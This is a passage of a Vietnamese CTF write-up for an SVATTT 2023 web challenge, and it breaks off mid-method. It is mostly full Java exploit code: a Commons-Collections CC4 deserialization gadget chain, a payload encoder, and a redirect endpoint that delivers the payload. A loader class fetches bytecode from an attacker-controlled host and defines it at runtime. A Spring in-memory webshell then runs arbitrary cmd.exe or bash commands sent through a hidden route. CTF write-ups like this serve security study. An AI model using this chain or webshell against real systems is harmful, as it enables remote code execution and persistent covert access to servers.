+<p>Vì không phải trọng tâm bài này nên bạn nào chưa hiểu chain CC4 có thể đọc <a href="/posts/2023/java-deserialization-p1/">bài này của mình</a>, đã phân tích phần lớn chain sử dụng sink là <code>TemplatesImpl</code> (bao gồm CC4).
+Về Spring Memshel thì vì chưa có thời gian nên mình chỉ mới <a href="/posts/2023/quick-note-spring-memshell/">quick note như này</a>, đủ để dùng.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// truncated</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ExploitUtils</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">pathEncode</span>(String s) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> s.<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;\\r\\n&#34;</span>, <span style="color:#e6db74">&#34;-&#34;</span>).<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;=&#34;</span>, <span style="color:#e6db74">&#34;%3D&#34;</span>).<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;\\+&#34;</span>, <span style="color:#e6db74">&#34;%2B&#34;</span>).<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;_&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> bufferSize <span style="color:#f92672">=</span> 256;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> ByteArrayOutputStream <span style="color:#a6e22e">gZipEncode</span>(InputStream inputStream) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream barr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        GZIPOutputStream gos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> GZIPOutputStream(barr);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>bufferSize<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> len;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span>((len <span style="color:#f92672">=</span> inputStream.<span style="color:#a6e22e">read</span>(buffer)) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1) {
+</span></span><span style="display:flex;"><span>                gos.<span style="color:#a6e22e">write</span>(buffer, 0, len);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">finally</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>{<span style="color:#66d9ef">if</span>(inputStream <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) inputStream.<span style="color:#a6e22e">close</span>();} <span style="color:#66d9ef">catch</span>(Exception e){}
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>{<span style="color:#66d9ef">if</span>(gos <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) gos.<span style="color:#a6e22e">close</span>();} <span style="color:#66d9ef">catch</span>(Exception e){}
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> barr;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span>(Object obj, String fieldName, Object value) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(fieldName);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(obj, value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> ByteArrayOutputStream <span style="color:#a6e22e">genCC4Proxy</span>(String className) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// get memshell bytecode</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bArr <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>().<span style="color:#a6e22e">get</span>(className).<span style="color:#a6e22e">toBytecode</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// gen CC4 serialized chain</span>
+</span></span><span style="display:flex;"><span>        TemplatesImpl tplsImpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{bArr});
+</span></span><span style="display:flex;"><span>        setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;ahihi&#34;</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ConstantTransformer constTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ConstantTransformer(TrAXFilter.<span style="color:#a6e22e">class</span>); <span style="color:#75715e">// loop 1 trả về TrAXFilter.class</span>
+</span></span><span style="display:flex;"><span>        InstantiateTransformer insTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InstantiateTransformer(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{javax.<span style="color:#a6e22e">xml</span>.<span style="color:#a6e22e">transform</span>.<span style="color:#a6e22e">Templates</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{tplsImpl}); <span style="color:#75715e">// loop 2 gọi class TrAXFilter constructor</span>
+</span></span><span style="display:flex;"><span>        ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(<span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>                constTransformer, insTransformer
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>        TransformingComparator transComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator(chainedTransformer);
+</span></span><span style="display:flex;"><span>        PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> priorityQueue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(transComparator);
+</span></span><span style="display:flex;"><span>        setFieldValue(priorityQueue, <span style="color:#e6db74">&#34;size&#34;</span>, 2);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        setFieldValue(priorityQueue, <span style="color:#e6db74">&#34;queue&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{1,1});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream barr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(barr);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(priorityQueue);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> barr;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">genDeserPayload</span>() <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// get CC4 memshell serialized gadget chain then gzip encode</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream barr <span style="color:#f92672">=</span> genCC4Proxy(evil.<span style="color:#a6e22e">MemTemplatesImpl</span>.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getName</span>());
+</span></span><span style="display:flex;"><span>        InputStream is <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(barr.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream outBarr <span style="color:#f92672">=</span> gZipEncode(is);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// b64 + path encode</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> outBarr.<span style="color:#a6e22e">toByteArray</span>();
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Generated payload length is: &#34;</span> <span style="color:#f92672">+</span> bytes.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>        String b64En <span style="color:#f92672">=</span>  Base64.<span style="color:#a6e22e">getEncoder</span>().<span style="color:#a6e22e">encodeToString</span>(bytes);
+</span></span><span style="display:flex;"><span>        String info <span style="color:#f92672">=</span> pathEncode(b64En);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(info);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> info;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        genDeserPayload();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><em>MemTemplatesImpl là class spring memshell mình lấy trong bài quick note ở trên</em></p>
+<p>Và mình đã thử và failed:
+<img src="/images/2023/SVATTT-2023_new-waf-deser/failed.png" alt="failed"></p>
+<p>Payload sau khi gzip có số bytes là <code>2623</code>, khi send sẽ không vào được deser. Vẫn poc cho có context. Host httpserver và redirect đến: <code>http://back/ticket/H4sIAAAAA....?compress=true</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(<span style="color:#e6db74">&#34;/tiktikboom&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ResponseBody</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ticket</span>(HttpServletResponse httpServletResponse) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        String exploitBackendURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://back/ticket/&#34;</span> <span style="color:#f92672">+</span> ExploitUtils.<span style="color:#a6e22e">genDeserPayload</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?compress=true&#34;</span>;
+</span></span><span style="display:flex;"><span>        httpServletResponse.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;Location&#34;</span>, exploitBackendURL);
+</span></span><span style="display:flex;"><span>        httpServletResponse.<span style="color:#a6e22e">setStatus</span>(301);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><img src="/images/2023/SVATTT-2023_new-waf-deser/req_failed.png" alt="req_failed"></p>
+<p>Vậy serialized chain chứa memshell là quá dài để exploit deser. Do đó mình lên ý tưởng lần deser đầu sẽ chạy 1 ít code, phần code này sẽ request đến remote server để lấy memshell bytecode sau đó mới load bytecode này để chèn memshell.
+What??, nhưng mà service <code>back</code> làm gì có outbound. Lúc đấy mình mới để ý đó là lý do tại sao service <code>front</code> lại cho ra internet, cùng xem lại file <code>docker-compose.yml</code>, phần <code>networks</code> của <code>front</code> nằm ở cả <code>no-internet</code> (chỉ connect <code>back</code>) và <code>internet</code> (có outbound):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">services</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">front</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>: <span style="color:#ae81ff">./front</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">web2_front</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">networks</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">internet</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">internet</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;8004:5000&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">depends_on</span>: 
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">back</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">always</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">back</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>: <span style="color:#ae81ff">./back</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">web2_back</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">networks</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">internet</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">always</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">networks</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">internet</span>: {}
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">no-internet</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">internal</span>: <span style="color:#66d9ef">true</span>
+</span></span></code></pre></div><p>Các host nằm chung 1 network thì có thể connect với nhau, dó đó từ service <code>back</code> có thể request tới <code>front</code>. Vậy cuối cùng ý tưởng sẽ là như này:</p>
+<ol>
+<li><code>Front</code> request đến <code>httpserver</code>, <code>httpserver</code> return redirect đến <code>back</code> service với chain CC4 deser kéo remote class bytecode memshell (ProxyTemplatesImpl)</li>
+<li><code>Back</code> deser CC4 chain trên và chạy code kéo remote bytecode, ở đây do không có outbound, callback URL ra httpserver sẽ đi qua <code>front</code>,  sau đó load bytecode để chèn memshell (MemTemplatesImpl)</li>
+<li>Memshell đã được load, dùng tiếp httpserver để con <code>front</code> redirect và truy cập memshell</li>
+</ol>
+<p>Để cho dễ hình dung thì là như này:
+<img src="/images/2023/SVATTT-2023_new-waf-deser/diagram.png" alt="diagram"></p>
+<p><code>ProxyTemplatesImpl</code> kéo bytecode qua <code>front</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ProxyTemplatesImpl</span> <span style="color:#66d9ef">extends</span> AbstractTranslet {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, SerializationHandler<span style="color:#f92672">[]</span> handlers)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throws</span> TransletException {}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#66d9ef">throws</span> TransletException {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">downloadUsingStream</span>(String urlStr) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(urlStr);
+</span></span><span style="display:flex;"><span>        java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">BufferedInputStream</span> bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">BufferedInputStream</span>(url.<span style="color:#a6e22e">openStream</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> classBytecode <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>bis.<span style="color:#a6e22e">available</span>()<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        bis.<span style="color:#a6e22e">read</span>(classBytecode);
+</span></span><span style="display:flex;"><span>        bis.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> classBytecode;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Class <span style="color:#a6e22e">loader</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        URLClassLoader classLoader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URLClassLoader(<span style="color:#66d9ef">new</span> URL<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>, Thread.<span style="color:#a6e22e">currentThread</span>().<span style="color:#a6e22e">getContextClassLoader</span>());
+</span></span><span style="display:flex;"><span>        java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">Method</span> method <span style="color:#f92672">=</span> ClassLoader.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;defineClass&#34;</span>, <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>, <span style="color:#66d9ef">int</span>.<span style="color:#a6e22e">class</span>, <span style="color:#66d9ef">int</span>.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        method.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (Class) method.<span style="color:#a6e22e">invoke</span>(classLoader, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{bytes, 0, bytes.<span style="color:#a6e22e">length</span>});
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ProxyTemplatesImpl</span>() <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>();
+</span></span><span style="display:flex;"><span>        String callback <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://front:5000/http://10.1.xx.93:8082/proxy/MemTemplatesImpl&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> memBytecode <span style="color:#f92672">=</span> downloadUsingStream(callback);
+</span></span><span style="display:flex;"><span>        loader(memBytecode).<span style="color:#a6e22e">newInstance</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>RequestMapping tương ứng:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// exploit from front</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(<span style="color:#e6db74">&#34;/tiktikboom&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ResponseBody</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ticket</span>(HttpServletResponse httpServletResponse) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>         System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Received request: /tiktikboom&#34;</span>);
+</span></span><span style="display:flex;"><span>        String exploitBackendURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://back/ticket/&#34;</span> <span style="color:#f92672">+</span> ExploitUtils.<span style="color:#a6e22e">genDeserPayload</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?compress=true&#34;</span>;
+</span></span><span style="display:flex;"><span>        httpServletResponse.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;Location&#34;</span>, exploitBackendURL);
+</span></span><span style="display:flex;"><span>        httpServletResponse.<span style="color:#a6e22e">setStatus</span>(301);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><code>MemTemplatesImpl</code> được request đến và load sau khi deser lần 1:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MemTemplatesImpl</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">MemTemplatesImpl</span>() <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>();
+</span></span><span style="display:flex;"><span>        WebApplicationContext context <span style="color:#f92672">=</span> RequestContextUtils.<span style="color:#a6e22e">findWebApplicationContext</span>(((ServletRequestAttributes) RequestContextHolder.<span style="color:#a6e22e">getRequestAttributes</span>()).<span style="color:#a6e22e">getRequest</span>());
+</span></span><span style="display:flex;"><span>        RequestMappingHandlerMapping mappingHandler <span style="color:#f92672">=</span> context.<span style="color:#a6e22e">getBean</span>(RequestMappingHandlerMapping.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        Method method <span style="color:#f92672">=</span> MemTemplatesImpl.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getMethod</span>(<span style="color:#e6db74">&#34;run&#34;</span>);
+</span></span><span style="display:flex;"><span>        Method getMappingForMethod <span style="color:#f92672">=</span> mappingHandler.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;getMappingForMethod&#34;</span>, Method.<span style="color:#a6e22e">class</span>, Class.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        getMappingForMethod.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        RequestMappingInfo mInfo <span style="color:#f92672">=</span> (RequestMappingInfo) getMappingForMethod.<span style="color:#a6e22e">invoke</span>(mappingHandler, method, MemTemplatesImpl.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        MemTemplatesImpl obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> MemTemplatesImpl(<span style="color:#e6db74">&#34;a&#34;</span>);
+</span></span><span style="display:flex;"><span>        mappingHandler.<span style="color:#a6e22e">registerMapping</span>(mInfo, obj, method);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">MemTemplatesImpl</span>(String a) {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@RequestMapping</span>(<span style="color:#e6db74">&#34;/a/ayooo&#34;</span>) <span style="color:#75715e">// memshell path</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            HttpServletRequest request <span style="color:#f92672">=</span> ((ServletRequestAttributes)RequestContextHolder.<span style="color:#a6e22e">currentRequestAttributes</span>()).<span style="color:#a6e22e">getRequest</span>();
+</span></span><span style="display:flex;"><span>            HttpServletResponse response <span style="color:#f92672">=</span> ((ServletRequestAttributes)RequestContextHolder.<span style="color:#a6e22e">currentRequestAttributes</span>()).<span style="color:#a6e22e">getResponse</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            String arg0 <span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getParameter</span>(<span style="color:#e6db74">&#34;devme_63hdsbx&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (arg0 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                ProcessBuilder p;
+</span></span><span style="display:flex;"><span>                String o <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>                PrintWriter w <span style="color:#f92672">=</span> response.<span style="color:#a6e22e">getWriter</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;os.name&#34;</span>).<span style="color:#a6e22e">toLowerCase</span>().<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;win&#34;</span>)) {
+</span></span><span style="display:flex;"><span>                    p <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;cmd.exe&#34;</span>, <span style="color:#e6db74">&#34;/c&#34;</span>, arg0});
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    p <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, arg0});
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Scanner</span> c <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Scanner</span>(p.<span style="color:#a6e22e">start</span>().<span style="color:#a6e22e">getInputStream</span>()).<span style="color:#a6e22e">useDelimiter</span>(<span style="color:#e6db74">&#34;\\A&#34;</span>);
+</span></span><span style="display:flex;"><span>                o <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">hasNext</span>() <span style="color:#f92672">?</span> c.<span style="color:#a6e22e">next</span>() : o;
+</span></span><span style="display:flex;"><span>                c.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>                w.<span style="color:#a6e22e">write</span>(o);
+</span></span><span style="display:flex;"><span>                w.<span style="color:#a6e22e">flush</span>();
+</span></span><span style="display:flex;"><span>                w.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                response.<span style="color:#a6e22e">sendError</span>(404);
+</span></span><span style="display:flex;"><span>            }
